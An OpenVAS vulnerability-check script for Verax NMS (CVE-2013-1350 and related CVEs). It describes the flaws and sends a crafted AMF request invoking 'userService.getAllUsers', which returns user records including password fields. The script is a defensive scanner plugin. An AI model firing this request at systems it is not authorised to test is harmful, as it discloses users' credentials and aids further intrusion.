###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_verax_nms_multiple_vuln.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# Verax Network Management System Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803181");
  script_version("$Revision: 11865 $");
  script_cve_id("CVE-2013-1350", "CVE-2013-1351", "CVE-2013-1352", "CVE-2013-1631");
  script_bugtraq_id(58334);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-03-15 13:15:33 +0530 (Fri, 15 Mar 2013)");
  script_name("Verax Network Management System Multiple Vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/52473");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Mar/38");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Mar/37");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Mar/36");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Mar/35");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/525916");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/525917");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/525918");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 9400);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to bypass certain security
  restrictions, perform unauthorized actions and obtain sensitive information.
  This may aid in launching further attacks.");
  script_tag(name:"affected", value:"Verax NMS version prior to 2.1.0");
  script_tag(name:"insight", value:"- An improper restricting access to certain actions via Action Message Format
    (AMF), which can be exploited to retrieve user information by requesting
    certain objects via AMF

  - The decryptPassword() uses a static, hard coded private key to facilitate
    process. These passwords should be considered insecure due to the fact
    that recovering the private key is decidedly trivial.

  - The private and public keys are hard coded into clientMain.swf the encrypted
    password could be captured and replayed against the service by an attacker.

  - The Verax NMS Console, users can navigate to monitored devices and perform
    predefined actions (NMSAction), such as repairing tables on a MySQL database
    or restarting services.");
  script_tag(name:"solution", value:"Upgrade to Verax NMS 2.1.0 or later.");
  script_tag(name:"summary", value:"The host is running Verax Network Management System and is prone to
  multiple vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.veraxsystems.com/en/products/nms");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:9400);

host = http_host_name(port:port);

sndReq = http_get(item:string("/enetworkmanagementsystem-fds/eNetwor",
         "kManagementSystem/index.jsp"), port:port);
rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

if("Path=/enetworkmanagementsystem-fds" >< rcvRes)
{

  postdata = raw_string(0x00, 0x03, 0x00, 0x00, 0x00, 0x01, 0x00, 0x17,
                        0x75, 0x73, 0x65, 0x72, 0x53, 0x65, 0x72, 0x76,
                        0x69, 0x63, 0x65, 0x2e, 0x67, 0x65, 0x74, 0x41,
                        0x6c, 0x6c, 0x55, 0x73, 0x65, 0x72, 0x73, 0x00,
                        0x02, 0x2f, 0x31, 0x00, 0x00, 0x00, 0x00, 0x0a,
                        0x00, 0x00, 0x00, 0x00);

  req = string("POST /enetworkmanagementsystem-fds/messagebroker/amf HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Type: application/x-amf\r\n",
               "Content-Length: ", strlen(postdata), "\r\n",
               "\r\n", postdata);
  rcvRes = http_keepalive_send_recv(port:port, data:req);

  if("user_id" ><  rcvRes && "user_pass" >< rcvRes &&
     "user_phone" >< rcvRes && "enetworkmanagementsystem" >< rcvRes)
  {
    security_message(port:port);
    exit(0);
  }
}

exit(99);